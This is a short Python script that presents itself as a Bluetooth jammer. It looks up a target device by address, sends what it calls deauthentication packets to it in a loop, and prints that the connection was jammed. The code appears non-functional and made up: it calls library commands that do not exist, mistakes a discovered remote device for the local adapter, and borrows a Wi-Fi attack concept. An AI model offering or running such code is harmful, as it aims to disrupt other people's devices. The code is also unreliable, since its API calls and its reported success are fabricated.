import bluetooth
import time

def jam_bluetooth(target_address):
    # Find the local Bluetooth adapter
    local_device = bluetooth.discover_devices(lookup_names=True)[0]
    local_address = local_device[0]
    local_name = local_device[1]

    # Find the target Bluetooth device
    target_name = bluetooth.lookup_name(target_address)

    # Send deauthentication packets to the target device
    for i in range(10):
        bluetooth.hci_send_cmd(local_address, bluetooth.HCICmd.DEAUTH, [target_address])
        time.sleep(0.1)

    print(f"Jammed Bluetooth connection between {local_name} and {target_name}")

# Example usage
target_address = "01:23:45:67:89:AB"  # Replace with the target device's Bluetooth address
jam_bluetooth(target_address)
